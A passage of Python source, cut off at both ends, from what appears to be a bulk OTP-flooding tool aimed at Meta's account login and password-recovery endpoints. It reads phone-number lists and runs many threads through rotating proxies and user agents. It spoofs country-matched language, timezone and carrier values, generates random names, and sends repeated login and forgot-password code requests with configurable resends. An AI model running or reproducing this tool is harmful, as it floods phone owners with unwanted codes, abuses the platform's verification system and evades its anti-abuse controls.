    '20': {'lang': 'ar-EG,ar;q=0.9,en-US;q=0.8', 'country': 'EG', 'browser_lang': ['ar-EG', 'ar', 'en-US']},
    '212': {'lang': 'ar-MA,ar;q=0.9,fr;q=0.8', 'country': 'MA', 'browser_lang': ['ar-MA', 'ar', 'fr']},
    '213': {'lang': 'ar-DZ,ar;q=0.9,fr;q=0.8', 'country': 'DZ', 'browser_lang': ['ar-DZ', 'ar', 'fr']},
    '216': {'lang': 'ar-TN,ar;q=0.9,fr;q=0.8', 'country': 'TN', 'browser_lang': ['ar-TN', 'ar', 'fr']},
    '234': {'lang': 'en-NG,en;q=0.9', 'country': 'NG', 'browser_lang': ['en-NG', 'en']},
    '27': {'lang': 'en-ZA,en;q=0.9,af;q=0.8', 'country': 'ZA', 'browser_lang': ['en-ZA', 'en', 'af']},
    '254': {'lang': 'sw-KE,sw;q=0.9,en-US;q=0.8', 'country': 'KE', 'browser_lang': ['sw-KE', 'sw', 'en-US']},
    '255': {'lang': 'sw-TZ,sw;q=0.9,en-US;q=0.8', 'country': 'TZ', 'browser_lang': ['sw-TZ', 'sw', 'en-US']},
    '256': {'lang': 'en-UG,en;q=0.9,sw;q=0.8', 'country': 'UG', 'browser_lang': ['en-UG', 'en', 'sw']},
    '233': {'lang': 'en-GH,en;q=0.9', 'country': 'GH', 'browser_lang': ['en-GH', 'en']},
    '251': {'lang': 'am-ET,am;q=0.9,en-US;q=0.8', 'country': 'ET', 'browser_lang': ['am-ET', 'am', 'en-US']},
    '218': {'lang': 'ar-LY,ar;q=0.9,en-US;q=0.8', 'country': 'LY', 'browser_lang': ['ar-LY', 'ar', 'en-US']},
    '249': {'lang': 'ar-SD,ar;q=0.9,en-US;q=0.8', 'country': 'SD', 'browser_lang': ['ar-SD', 'ar', 'en-US']},
    '221': {'lang': 'fr-SN,fr;q=0.9,en-US;q=0.8', 'country': 'SN', 'browser_lang': ['fr-SN', 'fr', 'en-US']},
    '225': {'lang': 'fr-CI,fr;q=0.9,en-US;q=0.8', 'country': 'CI', 'browser_lang': ['fr-CI', 'fr', 'en-US']},
    '228': {'lang': 'fr-TG,fr;q=0.9,en-US;q=0.8', 'country': 'TG', 'browser_lang': ['fr-TG', 'fr', 'en-US']},
    '237': {'lang': 'fr-CM,fr;q=0.9,en-US;q=0.8', 'country': 'CM', 'browser_lang': ['fr-CM', 'fr', 'en-US']},
    '244': {'lang': 'pt-AO,pt;q=0.9,en-US;q=0.8', 'country': 'AO', 'browser_lang': ['pt-AO', 'pt', 'en-US']},
    '258': {'lang': 'pt-MZ,pt;q=0.9,en-US;q=0.8', 'country': 'MZ', 'browser_lang': ['pt-MZ', 'pt', 'en-US']},
    '260': {'lang': 'en-ZM,en;q=0.9', 'country': 'ZM', 'browser_lang': ['en-ZM', 'en']},
    '263': {'lang': 'en-ZW,en;q=0.9', 'country': 'ZW', 'browser_lang': ['en-ZW', 'en']},
    '250': {'lang': 'rw-RW,rw;q=0.9,fr;q=0.8', 'country': 'RW', 'browser_lang': ['rw-RW', 'rw', 'fr', 'en-US']},
    '261': {'lang': 'mg-MG,mg;q=0.9,fr;q=0.8', 'country': 'MG', 'browser_lang': ['mg-MG', 'mg', 'fr', 'en-US']},
    '252': {'lang': 'so-SO,so;q=0.9,ar;q=0.8', 'country': 'SO', 'browser_lang': ['so-SO', 'so', 'ar', 'en-US']},
    '61': {'lang': 'en-AU,en;q=0.9,en-US;q=0.8', 'country': 'AU', 'browser_lang': ['en-AU', 'en', 'en-US']},
    '64': {'lang': 'en-NZ,en;q=0.9,en-US;q=0.8', 'country': 'NZ', 'browser_lang': ['en-NZ', 'en', 'en-US']},
    '679': {'lang': 'en-FJ,en;q=0.9', 'country': 'FJ', 'browser_lang': ['en-FJ', 'en']},
    '675': {'lang': 'en-PG,en;q=0.9', 'country': 'PG', 'browser_lang': ['en-PG', 'en']}
}

_COUNTRY_FB_LOCALE_CACHE = {}


def auto_fb_locale(country_code):
    if not country_code:
        return 'en_US'
    if country_code in _COUNTRY_FB_LOCALE_CACHE:
        return _COUNTRY_FB_LOCALE_CACHE[country_code]
    for prefix, data in _PREFIX_TO_COUNTRY.items():
        if data.get('country') == country_code:
            bl = data.get('browser_lang', ['en-US'])[0]
            fb_loc = bl.replace('-', '_')
            _COUNTRY_FB_LOCALE_CACHE[country_code] = fb_loc
            return fb_loc
    _COUNTRY_FB_LOCALE_CACHE[country_code] = 'en_US'
    return 'en_US'


_COUNTRY_TZ_OFFSET = {
    'US': -18000, 'CA': -18000, 'MX': -21600, 'GT': -21600, 'HN': -21600, 'SV': -21600,
    'NI': -21600, 'CR': -21600, 'PA': -18000, 'DO': -14400, 'CO': -18000, 'PE': -18000,
    'EC': -18000, 'BO': -14400, 'VE': -14400, 'BR': -10800, 'AR': -10800, 'CL': -14400,
    'PY': -10800, 'UY': -10800, 'GB': 0, 'IE': 0, 'PT': 0, 'IS': 0, 'MA': 0, 'SN': 0,
    'ML': 0, 'BF': 0, 'GM': 0, 'GN': 0, 'SL': 0, 'LR': 0, 'CI': 0, 'GH': 0, 'IT': 3600,
    'DE': 3600, 'FR': 3600, 'ES': 3600, 'NL': 3600, 'BE': 3600, 'AT': 3600, 'CH': 3600,
    'SE': 3600, 'NO': 3600, 'DK': 3600, 'PL': 3600, 'CZ': 3600, 'HU': 3600, 'SK': 3600,
    'SI': 3600, 'HR': 3600, 'BA': 3600, 'RS': 3600, 'ME': 3600, 'MK': 3600, 'AL': 3600,
    'BG': 7200, 'RO': 7200, 'TG': 0, 'NG': 3600, 'CM': 3600, 'GQ': 3600, 'GA': 3600,
    'CG': 3600, 'CD': 3600, 'AO': 3600, 'TD': 3600, 'NE': 3600, 'CF': 3600, 'FI': 7200,
    'EE': 7200, 'LV': 7200, 'LT': 7200, 'UA': 7200, 'MD': 7200, 'GR': 7200, 'TR': 10800,
    'CY': 7200, 'LB': 7200, 'SY': 7200, 'JO': 7200, 'IL': 7200, 'PS': 7200, 'EG': 7200,
    'SD': 7200, 'LY': 7200, 'ET': 10800, 'SO': 10800, 'DJ': 10800, 'ER': 10800, 'KE': 10800,
    'UG': 10800, 'TZ': 10800, 'RW': 7200, 'BI': 7200, 'ZM': 7200, 'MW': 7200, 'ZA': 7200,
    'MZ': 7200, 'BW': 7200, 'ZW': 7200, 'LS': 7200, 'SZ': 7200, 'SA': 10800, 'IQ': 10800,
    'KW': 10800, 'BH': 10800, 'QA': 10800, 'AE': 14400, 'OM': 14400, 'YE': 10800,
    'IR': 12690, 'AM': 14400, 'AZ': 14400, 'GE': 14400, 'AF': 16200, 'PK': 18000,
    'UZ': 18000, 'KZ': 18000, 'TM': 18000, 'TJ': 18000, 'KG': 18000, 'IN': 19800,
    'LK': 19800, 'NP': 20700, 'BT': 21600, 'BD': 21600, 'MM': 23400, 'TH': 25200,
    'LA': 25200, 'KH': 25200, 'VN': 25200, 'ID': 25200, 'MY': 28800, 'SG': 28800,
    'PH': 28800, 'CN': 28800, 'TW': 28800, 'HK': 28800, 'MO': 28800, 'JP': 32400,
    'KR': 32400, 'KP': 32400, 'MN': 28800, 'AU': 37800, 'NZ': 46800, 'FJ': 43200,
    'PG': 36000, 'RU': 10800, 'BY': 10800
}


def auto_tz_offset(country_code):
    return str(_COUNTRY_TZ_OFFSET.get(country_code, 0))


_COUNTRY_CARRIERS = {
    'US': ['T-Mobile', 'AT&T', 'Verizon', 'Sprint'],
    'GB': ['EE', 'Three', 'Vodafone UK', 'O2'],
    'DE': ['Telekom', 'Vodafone DE', 'o2-de'],
    'FR': ['Orange', 'SFR', 'Bouygues', 'Free'],
    'IT': ['WindTre', 'TIM', 'Vodafone IT', 'Iliad'],
    'ES': ['Movistar', 'Orange ES', 'Vodafone ES', 'Digi'],
    'BR': ['Vivo', 'Claro', 'TIM BR', 'Oi'],
    'MX': ['Telcel', 'AT&T MX', 'Movistar MX'],
    'AR': ['Movistar AR', 'Claro AR', 'Personal'],
    'IN': ['Jio', 'Airtel', 'Vi', 'BSNL'],
    'BD': ['Grameenphone', 'Robi', 'Banglalink', 'Teletalk'],
    'PK': ['Jazz', 'Telenor PK', 'Zong', 'Ufone'],
    'ID': ['Telkomsel', 'Indosat', 'XL Axiata', 'Tri'],
    'TH': ['AIS', 'TrueMove', 'dtac'],
    'VN': ['Viettel', 'Vinaphone', 'Mobifone'],
    'PH': ['Globe', 'Smart', 'Sun Cellular'],
    'MY': ['Maxis', 'Celcom', 'Digi', 'U Mobile'],
    'SG': ['SingTel', 'StarHub', 'M1'],
    'CN': ['China Mobile', 'China Unicom', 'China Telecom'],
    'JP': ['NTT Docomo', 'au', 'SoftBank', 'Rakuten Mobile'],
    'KR': ['SK Telecom', 'KT', 'LG U+'],
    'RU': ['MTS', 'MegaFon', 'Beeline', 'Tele2'],
    'UA': ['Kyivstar', 'Vodafone UA', 'Lifecell'],
    'TR': ['Turkcell', 'Vodafone TR', 'Turk Telekom'],
    'SA': ['STC', 'Mobily', 'Zain SA'],
    'AE': ['Etisalat', 'du', 'Virgin Mobile UAE'],
    'EG': ['Vodafone EG', 'Orange EG', 'Etisalat', 'WE'],
    'SD': ['Zain SD', 'MTN Sudan', 'Sudani', 'Canar'],
    'LY': ['Libyana', 'Almadar', 'Libya Telecom', 'Ooredoo LY'],
    'DZ': ['Mobilis', 'Djezzy', 'Ooredoo DZ'],
    'MA': ['Maroc Telecom', 'Orange MA', 'INWI'],
    'TN': ['Ooredoo TN', 'Orange TN', 'Tunisie Telecom'],
    'NG': ['MTN', 'Airtel', 'Glo', '9mobile'],
    'KE': ['Safaricom', 'Airtel', 'Telkom'],
    'ET': ['Ethio Telecom'],
    'GH': ['MTN GH', 'Vodafone GH', 'AirtelTigo'],
    'SN': ['Orange SN', 'Free SN', 'Expresso'],
    'CI': ['Orange CI', 'MTN CI', 'Moov CI'],
    'CM': ['MTN CM', 'Orange CM', 'Nextel'],
    'TZ': ['Vodacom TZ', 'Airtel TZ', 'Halotel', 'Tigo TZ'],
    'UG': ['MTN UG', 'Airtel UG', 'Uganda Telecom'],
    'RW': ['MTN RW', 'Airtel RW'],
    'ZM': ['MTN ZM', 'Airtel ZM', 'Zamtel'],
    'ZW': ['Econet', 'NetOne', 'Telecel'],
    'SO': ['Hormuud', 'Telcom', 'Somali Telecom'],
    'TG': ['Togocel', 'Moov Togo'],
    'IL': ['Cellcom', 'Partner', 'Pelephone', 'HOT Mobile'],
    'JO': ['Zain JO', 'Orange JO', 'Umniah'],
    'IQ': ['Zain IQ', 'Asiacell', 'Korek'],
    'KW': ['Zain KW', 'Ooredoo KW', 'Viva KW'],
    'QA': ['Ooredoo QA', 'Vodafone QA'],
    'BH': ['Batelco', 'Zain BH', 'STC BH'],
    'OM': ['Omantel', 'Ooredoo OM'],
    'YE': ['Yemen Mobile', 'MTN YE', 'Sabafon'],
    'AU': ['Telstra', 'Optus', 'Vodafone AU', 'TPG'],
    'NZ': ['Spark', 'Vodafone NZ', '2degrees'],
    'SE': ['Telia', 'Tele2 SE', 'Telenor SE'],
    'NO': ['Telenor', 'Telia NO', 'Ice'],
    'DK': ['TDC', 'Telenor DK', 'Telmore'],
    'FI': ['Elisa', 'Telia FI', 'DNA'],
    'PL': ['Orange PL', 'Play', 'Plus', 'T-Mobile PL'],
    'CZ': ['T-Mobile CZ', 'O2 CZ', 'Vodafone CZ'],
    'GR': ['Cosmote', 'Vodafone GR', 'WIND'],
    'PT': ['MEO', 'NOS', 'Vodafone PT'],
    'NL': ['KPN', 'Vodafone NL', 'T-Mobile NL'],
    'BE': ['Proximus', 'Orange BE', 'Base'],
    'CH': ['Swisscom', 'Sunrise', 'Salt'],
    'AT': ['A1', 'Magenta', 'Drei'],
    'IE': ['Vodafone IE', 'Three IE', 'Eir'],
    'HU': ['Telenor HU', 'Vodafone HU', 'Magyar Telekom'],
    'RO': ['Orange RO', 'Vodafone RO', 'Digi'],
    'BG': ['A1 BG', 'Vivacom', 'Telenor BG'],
    'FJ': ['Vodafone FJ', 'Digicel FJ'],
    'PG': ['Digicel PG', 'bmobile PNG'],
    '__generic__': ['MTN', 'Orange', 'Vodafone', 'Airtel', 'Etisalat']
}


def auto_carrier(country_code):
    carriers = _COUNTRY_CARRIERS.get(country_code) or _COUNTRY_CARRIERS['__generic__']
    return random.choice(carriers)


SELECTED_LANGUAGE_HEADER = None


def setup_language(setting_key='api_settings'):
    global SELECTED_LANGUAGE_HEADER
    clear_logo()
    lang_options = [
        ('Auto Match (Proxy/Number Country)', 'auto'),
        ('Arabic - Egypt (ar-EG)', 'ar-EG,ar;q=0.9,en-US;q=0.8', 'EG'),
        ('Arabic - Saudi Arabia (ar-SA)', 'ar-SA,ar;q=0.9,en-US;q=0.8', 'SA'),
        ('Arabic - UAE (ar-AE)', 'ar-AE,ar;q=0.9,en-US;q=0.8', 'AE'),
        ('Arabic - Algeria (ar-DZ)', 'ar-DZ,ar;q=0.9,fr;q=0.8', 'DZ'),
        ('Arabic - Morocco (ar-MA)', 'ar-MA,ar;q=0.9,fr;q=0.8', 'MA'),
        ('Bengali - Bangladesh (bn-BD)', 'bn-BD,bn;q=0.9,en-US;q=0.8', 'BD'),
        ('English - US (en-US)', 'en-US,en;q=0.9', 'US'),
        ('English - UK (en-GB)', 'en-GB,en;q=0.9', 'GB'),
        ('French - France (fr-FR)', 'fr-FR,fr;q=0.9,en-US;q=0.8', 'FR'),
        ('Russian - Russia (ru-RU)', 'ru-RU,ru;q=0.9,en-US;q=0.8', 'RU'),
        ('Portuguese - Brazil (pt-BR)', 'pt-BR,pt;q=0.9,en-US;q=0.8', 'BR'),
        ('Spanish - Mexico (es-MX)', 'es-MX,es;q=0.9,en-US;q=0.8', 'MX'),
        ('Turkish - Turkey (tr-TR)', 'tr-TR,tr;q=0.9,en-US;q=0.8', 'TR'),
        ('Hindi - India (hi-IN)', 'hi-IN,hi;q=0.9,en-US;q=0.8', 'IN'),
        ('Random / Rotate Languages', 'random')
    ]
    settings = load_settings(setting_key)
    lang_set = settings.get('language_settings', {})
    ask_lang = lang_set.get('ask_for_language', True)
    def_lang = lang_set.get('default_language', 'auto').strip()
    if not ask_lang:
        if def_lang == 'auto':
            SELECTED_LANGUAGE_HEADER = None
            print(f'{GREEN} [{RED}◆{GREEN}] Language Selected {EKL} Auto Match (Proxy/Number Country)')
        else:
            SELECTED_LANGUAGE_HEADER = def_lang
            print(f'{GREEN} [{RED}◆{GREEN}] Language Selected {EKL} {def_lang}')
        return SELECTED_LANGUAGE_HEADER

    print(f'{WHITE} Select Language for OTP requests:')
    for idx, (label, val, *rest) in enumerate(lang_options, 1):
        print(f'{GREEN} [{idx:02d}] {WHITE}{label}')
    print(LINE)
    choice = input(f'{GREEN} [{RED}◆{GREEN}] Select Language [Default: 01 Auto] {EKL} ').strip()
    if not choice or choice in ('1', '01'):
        SELECTED_LANGUAGE_HEADER = None
        print(f'{GREEN} [{RED}◆{GREEN}] Language Selected {EKL} Auto Match')
        return SELECTED_LANGUAGE_HEADER
    try:
        c_idx = int(choice) - 1
        if 0 <= c_idx < len(lang_options):
            opt = lang_options[c_idx]
            if opt[1] == 'auto':
                SELECTED_LANGUAGE_HEADER = None
            elif opt[1] == 'random':
                SELECTED_LANGUAGE_HEADER = 'random'
            elif len(opt) > 2:
                SELECTED_LANGUAGE_HEADER = (opt[1], opt[2])
            else:
                SELECTED_LANGUAGE_HEADER = opt[1]
            print(f'{GREEN} [{RED}◆{GREEN}] Language Selected {EKL} {opt[0]}')
            return SELECTED_LANGUAGE_HEADER
    except Exception:
        pass
    print(f'{YELLOW} Invalid selection. Defaulting to Auto Match.')
    SELECTED_LANGUAGE_HEADER = None
    return SELECTED_LANGUAGE_HEADER


def get_locale_for_proxy(proxy_data=None, phone_number=None):
    phone_country = None
    if phone_number:
        clean_num = str(phone_number).replace('+', '').replace('-', '').replace(' ', '')
        for prefix, data in sorted(_PREFIX_TO_COUNTRY.items(), key=lambda x: len(x[0]), reverse=True):
            if clean_num.startswith(prefix):
                phone_country = data['country']
                break

    if SELECTED_LANGUAGE_HEADER:
        if SELECTED_LANGUAGE_HEADER == 'random':
            item = random.choice(list(_PREFIX_TO_COUNTRY.values()))
            return item['lang'], phone_country or item['country'], item['browser_lang']
        if isinstance(SELECTED_LANGUAGE_HEADER, tuple):
            lang_str, c_code = SELECTED_LANGUAGE_HEADER
            return lang_str, phone_country or c_code, [lang_str.split(',')[0]]
        return SELECTED_LANGUAGE_HEADER, phone_country or 'US', [SELECTED_LANGUAGE_HEADER.split(',')[0]]

    if phone_number:
        clean_num = str(phone_number).replace('+', '').replace('-', '').replace(' ', '')
        for prefix, data in sorted(_PREFIX_TO_COUNTRY.items(), key=lambda x: len(x[0]), reverse=True):
            if clean_num.startswith(prefix):
                return data['lang'], data['country'], data['browser_lang']

    if proxy_data and isinstance(proxy_data, dict) and 'country' in proxy_data and proxy_data['country'] != 'Unknown':
        proxy_country = proxy_data['country']
        for prefix, data in _PREFIX_TO_COUNTRY.items():
            if data['country'] == proxy_country:
                return data['lang'], data['country'], data['browser_lang']

    for prefix, data in sorted(_PREFIX_TO_COUNTRY.items(), key=lambda x: len(x[0]), reverse=True):
        if data['country'] == 'US':
            return data['lang'], data['country'], data['browser_lang']

    item = random.choice(list(_PREFIX_TO_COUNTRY.values()))
    return item['lang'], item['country'], item['browser_lang']


import urllib.parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from concurrent.futures import ThreadPoolExecutor
import concurrent.futures
from urllib.parse import urlparse, parse_qs
import uuid

try:
    sys.stdout.reconfigure(encoding='utf-8')
except Exception:
    pass


def safe_get(session, url, headers=None, timeout=30):
    curr_url = url
    resp = None
    for _ in range(10):
        try:
            resp = session.get(curr_url, headers=headers, allow_redirects=False, timeout=timeout)
        except Exception as e:
            err_str = str(e)
            if 'fbredirect://' in err_str:
                match = re.search(r"uri=([^'&]+)", err_str)
                if match:
                    curr_url = urllib.parse.unquote(match.group(1))
                    continue
            raise
        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get('Location') or resp.headers.get('location')
            if not loc:
                return resp
            if loc.startswith('fbredirect://'):
                match = re.search(r'uri=([^&]+)', loc)
                if match:
                    curr_url = urllib.parse.unquote(match.group(1))
                    continue
                curr_url = loc.replace('fbredirect://', 'https://')
                continue
            if loc.startswith('/'):
                curr_url = 'https://m.facebook.com' + loc
            elif not loc.startswith('http'):
                curr_url = 'https://m.facebook.com/' + loc
            else:
                curr_url = loc
            continue
        return resp
    return resp


def run():
    clear_logo()
    numbers = file_input('api_settings')
    if not numbers:
        input(f'{WHITE} Press Enter to exit...')
        return
    ua_func = setup_user_agent('api_settings')
    PROXY_LIST, PROXY_ITERATOR = setup_proxies('api_settings')
    setup_language('api_settings')
    resend_count = setup_otp_resend('api_settings')
    max_workers = setup_threads('api_settings')
    clear_logo()
    reset_counters()
    original_numbers = list(numbers)
    set_total_numbers(len(original_numbers))
    print(f'{GREEN} [{RED}◆{GREEN}] Total Numbers  {EKL} {len(original_numbers)}')
    print(f'{GREEN} [{RED}◆{GREEN}] Threads         {EKL} {max_workers}')
    print(f"{GREEN} [{RED}◆{GREEN}] Proxies         {EKL} {len(PROXY_LIST) if PROXY_LIST else 'None'}")
    print(LINE)
    executor = ThreadPoolExecutor(max_workers=max_workers)
    remaining_numbers = list(original_numbers)
    retry_counts = {num: 0 for num in original_numbers}
    future_to_num = {}
    for num in original_numbers:
        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
        user_agent = ua_func()
        future = executor.submit(process_number, num, user_agent, proxy_data, resend_count)
        future_to_num[future] = num
    try:
        while future_to_num:
            done, _ = concurrent.futures.wait(future_to_num.keys(), return_when=concurrent.futures.FIRST_COMPLETED)
            for future in done:
                n = future_to_num.pop(future)
                try:
                    res = future.result()
                except Exception:
                    res = None
                if res == 'RETRY':
                    attempts = retry_counts.get(n, 0)
                    if attempts < 2:
                        retry_counts[n] = attempts + 1
                        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
                        user_agent = ua_func()
                        new_f = executor.submit(process_number, n, user_agent, proxy_data, resend_count)
                        future_to_num[new_f] = n
                        continue
                with file_lock:
                    if n in remaining_numbers:
                        remaining_numbers.remove(n)
                save_remaining_numbers(remaining_numbers)
    finally:
        executor.shutdown(wait=True)
    display_final_summary(continuous_mode=False)


def generate_random_username():
    p1 = (
        ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4))) +
        ''.join(random.choices(string.digits, k=random.randint(1, 3))) +
        ''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 2)))
    )
    p2 = (
        ''.join(random.choices(string.digits, k=random.randint(1, 2))) +
        ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
    )
    p3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 6)))
    p1 = ''.join(random.sample(p1, len(p1)))
    p2 = ''.join(random.sample(p2, len(p2)))
    p3 = ''.join(random.sample(p3, len(p3)))
    return f'{p1}.{p2}.{p3}'


def generate_random_first_name():
    first_names = [
        'John', 'Emma', 'Liam', 'Olivia', 'Noah', 'Ava', 'William', 'Sophia', 'James', 'Isabella',
        'Benjamin', 'Mia', 'Elijah', 'Charlotte', 'Lucas', 'Amelia', 'Mason', 'Harper', 'Logan', 'Evelyn',
        'David', 'Sarah', 'Michael', 'Jessica', 'Chris', 'Ashley', 'Matthew', 'Emily', 'Daniel', 'Amanda',
        'Alexander', 'Abigail', 'Henry', 'Ella', 'Jackson', 'Elizabeth', 'Sebastian', 'Camila', 'Aiden', 'Luna',
        'Joseph', 'Sofia', 'Samuel', 'Avery', 'Carter', 'Mila', 'Owen', 'Aria', 'Wyatt', 'Scarlett',
        'Ethan', 'Penelope', 'Gabriel', 'Layla', 'Luke', 'Chloe', 'Isaac', 'Victoria', 'Anthony', 'Madison',
        'Julian', 'Eleanor', 'Dylan', 'Grace', 'Levi', 'Nora', 'Christopher', 'Riley', 'Andrew', 'Zoey',
        'Mateo', 'Hannah', 'Ryan', 'Hazel', 'Jaxon', 'Lily', 'Nathan', 'Ellie', 'Aaron', 'Violet',
        'Charles', 'Lillian', 'Christian', 'Zoe', 'Thomas', 'Stella', 'Isaiah', 'Aurora', 'Caleb', 'Natalie',
        'Josiah', 'Emilia', 'Jonathan', 'Everly', 'Hunter', 'Leah', 'Eli', 'Aubrey', 'Joshua', 'Willow'
    ]
    return random.choice(first_names)


def generate_random_last_name():
    last_names = [
        'Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor',
        'Anderson', 'Thomas', 'Jackson', 'White', 'Harris', 'Martin', 'Thompson', 'Garcia', 'Martinez', 'Robinson',
        'Clark', 'Rodriguez', 'Lewis', 'Lee', 'Walker', 'Hall', 'Allen', 'Young', 'Hernandez', 'King',
        'Wright', 'Lopez', 'Hill', 'Scott', 'Green', 'Adams', 'Baker', 'Gonzalez', 'Nelson', 'Carter',
        'Mitchell', 'Perez', 'Roberts', 'Turner', 'Phillips', 'Campbell', 'Parker', 'Evans', 'Edwards', 'Collins',
        'Stewart', 'Sanchez', 'Morris', 'Rogers', 'Reed', 'Cook', 'Morgan', 'Bell', 'Murphy', 'Bailey',
        'Rivera', 'Cooper', 'Richardson', 'Cox', 'Howard', 'Ward', 'Torres', 'Peterson', 'Gray', 'Ramirez',
        'James', 'Watson', 'Brooks', 'Kelly', 'Sanders', 'Price', 'Bennett', 'Wood', 'Barnes', 'Ross',
        'Henderson', 'Coleman', 'Jenkins', 'Perry', 'Powell', 'Long', 'Patterson', 'Hughes', 'Flores', 'Washington',
        'Butler', 'Simmons', 'Foster', 'Gonzales', 'Bryant', 'Alexander', 'Russell', 'Griffin', 'Diaz', 'Hayes'
    ]
    return random.choice(last_names)


def strip_json_prefix(text):
    if text.startswith('for (;;);'):
        return text[9:]
    return text


def build_common_params(
    hs, rev, s_val, hsi, dyn, csr, comet_req, lsd, jazoest, spin_b, spin_t,
    ccg='EXCELLENT', hsdp=META_DEFAULT_HSDP, hblp=META_DEFAULT_HBLP, sjsp=META_DEFAULT_SJSP
):
    return {
        '__user': '0',
        '__a': '1',
        '__hs': hs,
        'dpr': '1',
        '__ccg': ccg,
        '__rev': rev,
        '__s': s_val,
        '__hsi': hsi,
        '__dyn': dyn,
        '__csr': csr,
        '__hsdp': hsdp,
        '__hblp': hblp,
        '__sjsp': sjsp,
        '__comet_req': comet_req,
        'lsd': lsd,
        'jazoest': jazoest,
        '__spin_r': rev,
        '__spin_b': spin_b,
        '__spin_t': spin_t,
        '__jssesw': '1'
    }


def extract_ccg(response):
    try:
        cq = response.headers.get('x-fb-connection-quality', '')
        if cq:
            grade = cq.split(';')[0].strip()
            if grade:
                return grade
    except Exception:
        pass
    return 'GOOD'


def send_otp_for_existing_account(
    session, number, contact_point, auth_referer, auth_lsd, auth_hs, auth_rev, auth_hsi,
    auth_dyn, auth_csr, auth_comet_req, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
    auth_hsdp, auth_hblp, auth_sjsp, api_headers, lang_header, csi, waterfall_id,
    resend_count, ua_display, country_code, actual_proxy_country, error_code=None
):
    contact_point_e164 = number.strip() if str(number).strip().startswith('+') else '+' + str(number).strip()
    skip_strategy1 = error_code in (3571188, 3571178, 3571189)
    if not skip_strategy1:
        safe_print(f'{CYAN} {number} Existing Account Detected! Attempting Login OTP Flow... [{ua_display}]{RESET}')
        try:
            s_val_nonce = generate_s_val()
            nonce_headers = {
                **api_headers,
                'accept-language': lang_header,
                'origin': 'https://auth.meta.com',
                'referer': auth_referer,
                'x-fb-lsd': auth_lsd
            }
            nonce_data = {
                'contact_point': contact_point_e164,
                'qpl_join_id': generate_qpl_join_id(),
                'source_app_id': '1522763855472543',
                'waterfall_id': waterfall_id,
                'use_fb_cp_nonce': 'false',
                'use_ig_cp_nonce': 'false',
                **build_common_params(
                    auth_hs, auth_rev, s_val_nonce, auth_hsi, auth_dyn, auth_csr,
                    auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                    auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
                ),
                '__req': '1i'
            }
            nonce_resp = session.post('https://auth.meta.com/api/login-email-otp/send-nonce/', headers=nonce_headers, data=nonce_data, timeout=30)
            nonce_text = strip_json_prefix(nonce_resp.text)
            nonce_json = json.loads(nonce_text)
            if nonce_json.get('payload', {}).get('success'):
                update_counter(
                    'success', number,
                    f'OTP Sent to Existing Account! [UA: {ua_display}] [Country: {country_code}] [Proxy: {actual_proxy_country}]',
                    GREEN
                )
                save_success_number(number)
                save_registered_number(number)
                if resend_count > 0:
                    for r_idx in range(1, resend_count + 1):
                        time.sleep(round(random.uniform(2.5, 4.0), 2))
                        try:
                            s_val_resend = generate_s_val()
                            resend_nonce_data = {
                                'contact_point': contact_point_e164,
                                'qpl_join_id': generate_qpl_join_id(),
                                'source_app_id': '1522763855472543',
                                'waterfall_id': waterfall_id,
                                'use_fb_cp_nonce': 'false',
                                'use_ig_cp_nonce': 'false',
                                **build_common_params(
                                    auth_hs, auth_rev, s_val_resend, auth_hsi, auth_dyn, auth_csr,
                                    auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                                    auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
                                ),
                                '__req': to_base36(55 + r_idx)
                            }
                            resend_resp = session.post('https://auth.meta.com/api/login-email-otp/send-nonce/', headers=nonce_headers, data=resend_nonce_data, timeout=30)
                            resend_text = strip_json_prefix(resend_resp.text)
                            resend_json = json.loads(resend_text)
                            if resend_json.get('payload', {}).get('success'):
                                safe_print(f'{GREEN} {number} OTP Resend {r_idx}/{resend_count} Successful! (Existing) [{actual_proxy_country}] [UA: {ua_display}]{RESET}')
                            else:
                                safe_print(f'{YELLOW} {number} OTP Resend {r_idx}/{resend_count} Failed (Existing) [{actual_proxy_country}] [UA: {ua_display}]{RESET}')
                        except Exception as e:
                            safe_print(f'{YELLOW} {number} Resend OTP {r_idx} Error (Existing): {e} [{actual_proxy_country}]{RESET}')
                return True
            err_desc = nonce_json.get('errorDescription') or nonce_json.get('errorSummary') or str(nonce_json.get('error', 'Failed'))
            safe_print(f'{YELLOW} {number} Login Flow returned: {err_desc}. Trying Recovery Flow... [{actual_proxy_country}]{RESET}')
        except Exception as e:
            safe_print(f'{YELLOW} {number} Login OTP error ({e}). Trying Recovery Flow... [{actual_proxy_country}]{RESET}')
    else:
        safe_print(f'{CYAN} {number} Pending Contact Point (Code {error_code}) Detected! Directly using Recovery Flow (MB Saved)... [{ua_display}]{RESET}')

    if not skip_strategy1:
        safe_print(f'{CYAN} {number} Switching to Account Recovery OTP Flow (Forgot Password)... [{ua_display}]{RESET}')

    try:
        s_val_fp = generate_s_val()
        fp_headers = {
            **api_headers,
            'accept-language': lang_header,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd
        }
        fp_data = {
            'contact_point': contact_point_e164,
            'qpl_join_id': generate_qpl_join_id(),
            'source_app_id': '1522763855472543',
            'caa_event_flow': 'account_recovery',
            'csi': csi,
            'event_client_time': f'{time.time():.3f}',
            'waterfall_id': waterfall_id,
            **build_common_params(
                auth_hs, auth_rev, s_val_fp, auth_hsi, auth_dyn, auth_csr,
                auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
            ),
            '__req': '43'
        }
        fp_resp = session.post('https://auth.meta.com/api/reset-password/handle-forgot-password/', headers=fp_headers, data=fp_data, timeout=30)
        fp_text = strip_json_prefix(fp_resp.text)
        fp_json = json.loads(fp_text)
